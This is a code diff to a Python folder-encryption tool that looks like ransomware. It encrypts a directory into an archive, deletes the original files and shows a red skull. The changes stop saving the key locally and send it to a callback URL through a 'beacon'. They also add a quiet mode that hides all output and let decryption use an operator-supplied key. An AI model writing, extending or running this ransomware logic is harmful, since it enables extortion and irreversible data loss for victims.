-                    centered_lines.append(" " * pad_line + stripped)
-            centered_skull = "\n".join(centered_lines)
-
-            # Clear screen and move cursor home.
-            sys.stdout.write("\033[2J\033[H")
-            # Header & subtitle in red.
-            sys.stdout.write("\033[31m")
-            sys.stdout.write(header_line + "\n")
-            sys.stdout.write(subtitle_line + "\n\n")
-            sys.stdout.write("\033[0m")
-            # Skull in red.
-            sys.stdout.write("\033[31m")
-            sys.stdout.write(centered_skull)
-            sys.stdout.write("\033[0m")
-            sys.stdout.flush()
-
-            idx += 1
-            time.sleep(0.25)
-    except KeyboardInterrupt:
-        sys.stdout.write("\n")
-        sys.stdout.flush()
+    # Clear screen and move cursor home.
+    sys.stdout.write("\033[2J\033[H")
+    sys.stdout.write("\033[31m")
+    sys.stdout.write(header_line + "\n")
+    sys.stdout.write(subtitle_line + "\n\n")
+    sys.stdout.write(centered_skull)
+    sys.stdout.write("\033[0m")
+    sys.stdout.flush()
 
 
 def delete_encrypted_source_files(
@@ -368,7 +481,7 @@ def read_key_from_info_file(info_path: Path) -> bytes:
 
     raise SystemExit(
         f"Could not find encryption key in info file: {info_path}. "
-        "Expected a non-empty line after the 'Encryption key' line."
+        "If the key was sent via beacon only, use --key or --key-file with the key from your beacon log."
     )
 
 
@@ -400,7 +513,7 @@ def encrypt_folder(config: EncryptConfig) -> None:
     print(f"[+] Encrypted archive written to: {config.output_file}")
 
     print(f"[+] Writing encryption info file to: {config.info_file}")
-    write_info_file(config.info_file, key=key, encrypted_file=config.output_file)
+    write_info_file(config.info_file, encrypted_file=config.output_file)
     print(f"[+] Info file written. Deleting original files in {config.folder}")
     # Keep the encrypted archive and the info file; delete everything else.
     delete_encrypted_source_files(
@@ -408,10 +521,20 @@ def encrypt_folder(config: EncryptConfig) -> None:
     )
     print("[+] Encryption complete. Original files removed.")
 
+    if config.callback_url:
+        send_beacon(config.callback_url, key)
+
 
 def decrypt_folder(config: DecryptConfig) -> None:
-    print(f"[+] Reading encryption key from: {config.info_file}")
-    key = read_key_from_info_file(config.info_file)
+    if config.key is not None:
+        key = config.key
+        print("[+] Using encryption key from --key or --key-file")
+    else:
+        print(f"[+] Reading encryption key from: {config.info_file}")
+        if config.info_file is None or not config.info_file.exists():
+            raise SystemExit("No key provided and info file not found. Use --key or --key-file.")
+        key = read_key_from_info_file(config.info_file)
+
     fernet = Fernet(key)
 
     print(f"[+] Reading encrypted archive: {config.encrypted_file}")
@@ -425,22 +548,38 @@ def decrypt_folder(config: DecryptConfig) -> None:
 
     print(f"[+] Extracting zip contents to: {config.output_folder}")
     config.output_folder.mkdir(parents=True, exist_ok=True)
-    with zipfile.ZipFile(io.BytesIO(zip_bytes), mode="r") as zf:
-        zf.extractall(config.output_folder)
+    try:
+        with zipfile.ZipFile(io.BytesIO(zip_bytes), mode="r") as zf:
+            zf.extractall(config.output_folder)
+    except zipfile.BadZipFile as exc:
+        raise SystemExit(
+            "Decrypted data is not a valid zip file. "
+            "The key may not match the encrypted file, or the .enc file may be corrupted or from another source."
+        ) from exc
+
+    # Remove the encrypted archive and info file after successful restore.
+    for path in (config.encrypted_file, config.info_file):
+        if path is not None and path.exists() and path.is_file():
+            try:
+                path.unlink()
+                print(f"[+] Removed: {path}")
+            except OSError:
+                pass
 
     print("[+] Decryption complete.")
 
 
 def main(argv: Optional[list[str]] = None) -> None:
     args = parse_args(argv)
+    if getattr(args, "quiet", False):
+        sys.stdout = open(os.devnull, "w")
+        sys.stderr = open(os.devnull, "w")
     if args.decrypt:
         cfg = build_decrypt_config(args)
         decrypt_folder(cfg)
     else:
         cfg = build_encrypt_config(args)
         encrypt_folder(cfg)
-        print("[+] Encryption complete. Press Ctrl+C to stop the animation.")
-        show_laughing_skull()
 
 
 if __name__ == "__main__":
